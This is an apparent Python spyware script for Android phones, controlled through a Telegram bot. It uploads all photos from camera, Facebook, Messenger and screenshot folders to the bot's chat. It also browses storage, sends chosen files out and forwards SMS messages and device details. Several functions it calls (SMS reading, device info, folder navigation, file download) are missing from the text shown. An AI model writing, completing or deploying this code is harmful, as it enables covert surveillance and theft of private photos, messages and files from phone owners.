import os
import requests
import json
import subprocess
from threading import Thread, Event

# Replace with your bot token and chat ID
TOKEN = 'YOUR_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'

# Global variable to store current folder path and download state
current_folder = "/storage/emulated/0/"
download_event = Event()  # Event to control the download process
download_event.set()      # Initially allow downloading

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to send a file to Telegram
def send_file_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {"chat_id": CHAT_ID}
        try:
            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                print(f"File {file_path} sent successfully!")
                send_to_telegram(f"File `{os.path.basename(file_path)}` sent successfully!")
            else:
                print(f"Failed to send file. Status code: {response.status_code}, Response: {response.text}")
                send_to_telegram(f"Failed to send file `{os.path.basename(file_path)}`. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error sending file {file_path}: {str(e)}")
            send_to_telegram(f"Error sending file `{os.path.basename(file_path)}`: {str(e)}")

# Function to download images from specified locations
def download_images():
    global download_event
    locations = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/DCIM/Facebook",
        "/storage/emulated/0/Pictures/Screenshots",
        "/storage/emulated/0/Pictures/Messenger"
    ]
    downloaded_files = set()  # To keep track of downloaded files

    for location in locations:
        if not os.path.exists(location):
            send_to_telegram(f"Location `{location}` does not exist.")
            continue

        for root, _, files in os.walk(location):
            for file in files:
                if not download_event.is_set():
                    send_to_telegram("Download stopped.")
                    return
                
                if file.lower().endswith(('.jpg', '.png')):
                    file_path = os.path.join(root, file)
                    
                    if file_path in downloaded_files:
                        continue
                    
                    downloaded_files.add(file_path)
                    send_file_to_telegram(file_path)

# Function to handle Telegram commands for downloading photos and stopping downloads
def handle_telegram_update(update):
    global download_event
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            if message == "/sms":
                sms_messages = get_sms()
                send_to_telegram(sms_messages)
            
            elif message == "/device":
                device_info = get_device_info()
                send_to_telegram(device_info)

            elif message == "/sdcard":
                global current_folder
                current_folder = "/storage/emulated/0/"
                send_to_telegram(f"Navigating to SD card: `{current_folder}`")
                handle_folder_navigation("")  # Show initial folder contents

            elif message == "/download_photo":
                if download_event.is_set():
                    send_to_telegram("Starting photo download...")
                    download_event.set()  # Ensure downloading is allowed
                    download_thread = Thread(target=download_images)
                    download_thread.start()
                else:
                    send_to_telegram("Photo download is already in progress.")

            elif message == "/download_photo_stop":
                download_event.clear()  # Stop downloading
                send_to_telegram("Photo download stopped.")

            else:
                folder_path = os.path.join(current_folder, message)
                if os.path.isdir(folder_path):
                    handle_folder_navigation(message)
                else:
                    response_message = download_file(message)
                    send_to_telegram(response_message)
    
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Example of how to handle incoming Telegram updates
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        params = {'timeout': 100, 'offset': last_update_id}
        response = requests.get(url, params=params)
        updates = response.json().get('result', [])
        
        for update in updates:
            last_update_id = update['update_id'] + 1
            handle_telegram_update(update)

if __name__ == "__main__":
    # Step 1: Start in the base folder and show the list of files/folders
    send_to_telegram(f"Current folder: `{current_folder}`")
    handle_folder_navigation("")  # Show initial folder contents
    
    # Step 2: Listen for user input (folder, file, SMS, device info, photo download)
    listen_for_updates()
